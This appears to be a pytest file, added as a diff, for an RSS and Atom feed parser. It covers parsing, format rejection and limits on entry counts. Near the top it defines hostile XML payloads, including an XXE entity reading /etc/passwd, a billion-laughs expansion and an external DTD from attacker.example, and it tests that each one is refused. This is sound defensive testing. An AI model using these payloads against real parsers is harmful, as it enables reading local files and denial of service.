@@ -1,0 +1,150 @@
+"""RSS and Atom parsing, and the XML attacks that must not be possible."""
+
+from __future__ import annotations
+
+from datetime import UTC, datetime
+
+import pytest
+
+from app.ingest.errors import ParseError, UnsafeDocumentError, UnsupportedFeedFormatError
+from app.ingest.parse import MAX_ENTRIES, parse_feed
+
+XXE = b"""<?xml version="1.0"?>
+<!DOCTYPE rss [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<rss version="2.0"><channel><title>&xxe;</title></channel></rss>"""
+
+BILLION_LAUGHS = b"""<?xml version="1.0"?>
+<!DOCTYPE lolz [
+ <!ENTITY lol "lol">
+ <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+ <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+]>
+<rss version="2.0"><channel><title>&lol3;</title></channel></rss>"""
+
+EXTERNAL_DTD = b"""<?xml version="1.0"?>
+<!DOCTYPE rss SYSTEM "https://attacker.example/evil.dtd">
+<rss version="2.0"><channel><title>t</title></channel></rss>"""
+
+
+# --- hostile XML --------------------------------------------------------
+
+
+@pytest.mark.parametrize(
+    ("name", "body"),
+    [("xxe", XXE), ("billion-laughs", BILLION_LAUGHS), ("external-dtd", EXTERNAL_DTD)],
+)
+def test_hostile_xml_is_refused(name: str, body: bytes) -> None:
+    with pytest.raises(UnsafeDocumentError):
+        parse_feed(body)
+
+
+def test_empty_body_is_a_parse_error() -> None:
+    with pytest.raises(ParseError):
+        parse_feed(b"")
+
+
+def test_not_xml_is_a_parse_error() -> None:
+    with pytest.raises(ParseError):
+        parse_feed(b"<html><body>this is a web page</body></html>")
+
+
+def test_html_page_is_not_a_feed() -> None:
+    with pytest.raises(ParseError):
+        parse_feed(b"<?xml version='1.0'?><html><body><p>hello</p></body></html>")
+
+
+def test_json_feed_is_refused() -> None:
+    with pytest.raises(ParseError):
+        parse_feed(b'{"version": "https://jsonfeed.org/version/1", "items": []}')
+
+
+def test_sitemap_is_not_a_feed() -> None:
+    sitemap = (
+        b"<?xml version='1.0'?>"
+        b"<urlset xmlns='http://www.sitemaps.org/schemas/sitemap/0.9'>"
+        b"<url><loc>https://example.org/a</loc></url></urlset>"
+    )
+    with pytest.raises(UnsupportedFeedFormatError):
+        parse_feed(sitemap)
+
+
+# --- RSS ----------------------------------------------------------------
+
+
+def test_rss_is_parsed(rss_feed: bytes) -> None:
+    parsed = parse_feed(rss_feed)
+    assert parsed.version.startswith("rss")
+    assert parsed.title == "Example Feed"
+    assert len(parsed.entries) == 2
+
+    first = parsed.entries[0]
+    assert first.title == "First article"
+    assert first.link == "https://example.org/first"
+    assert first.published == datetime(2026, 8, 17, 9, 0, tzinfo=UTC)
+    assert first.summary is not None and "enough" in first.summary
+
+
+def test_rss_with_a_bom_is_parsed(rss_feed: bytes) -> None:
+    assert len(parse_feed(b"\xef\xbb\xbf" + rss_feed).entries) == 2
+
+
+# --- Atom ---------------------------------------------------------------
+
+
+def test_atom_is_parsed(atom_feed: bytes) -> None:
+    parsed = parse_feed(atom_feed)
+    assert parsed.version.startswith("atom")
+    assert [entry.title for entry in parsed.entries] == ["Atom one", "Atom two"]
+    assert parsed.entries[0].link == "https://example.org/atom-one"
+    assert parsed.entries[0].published == datetime(2026, 8, 17, 8, 30, tzinfo=UTC)
+    # No <published>, so <updated> is the fallback within the parser.
+    assert parsed.entries[1].published == datetime(2026, 8, 17, 7, 0, tzinfo=UTC)
+
+
+def test_atom_link_falls_back_to_the_links_collection() -> None:
+    body = b"""<?xml version="1.0"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>t</title><id>urn:x</id><updated>2026-08-17T09:00:00Z</updated>
+  <entry>
+    <title>Only a links element</title>
+    <id>urn:uuid:1234</id>
+    <link rel="alternate" type="text/html" href="https://example.org/alt"/>
+    <updated>2026-08-17T09:00:00Z</updated>
+  </entry>
+</feed>"""
+    assert parse_feed(body).entries[0].link == "https://example.org/alt"
+
+
+# --- bounds -------------------------------------------------------------
+
+
+def test_entry_count_is_bounded() -> None:
+    items = "".join(
+        f"<item><title>t{n}</title><link>https://example.org/{n}</link></item>"
+        for n in range(MAX_ENTRIES + 50)
+    )
+    body = (
+        f"<?xml version='1.0'?><rss version='2.0'><channel><title>t</title>{items}</channel></rss>"
+    ).encode()
+    assert len(parse_feed(body).entries) == MAX_ENTRIES
+
+
+def test_entry_without_a_date_reports_none() -> None:
+    body = (
+        b"<?xml version='1.0'?><rss version='2.0'><channel><title>t</title>"
+        b"<item><title>No date</title><link>https://example.org/x</link></item>"
+        b"</channel></rss>"
+    )
+    assert parse_feed(body).entries[0].published is None
+
+
+def test_media_thumbnail_becomes_the_image() -> None:
+    body = (
+        b"<?xml version='1.0'?>"
+        b"<rss version='2.0' xmlns:media='http://search.yahoo.com/mrss/'>"
+        b"<channel><title>t</title><item><title>i</title>"
+        b"<link>https://example.org/x</link>"
+        b"<media:thumbnail url='https://cdn.example.org/x.jpg'/>"
+        b"</item></channel></rss>"
+    )
+    assert parse_feed(body).entries[0].image_url == "https://cdn.example.org/x.jpg"
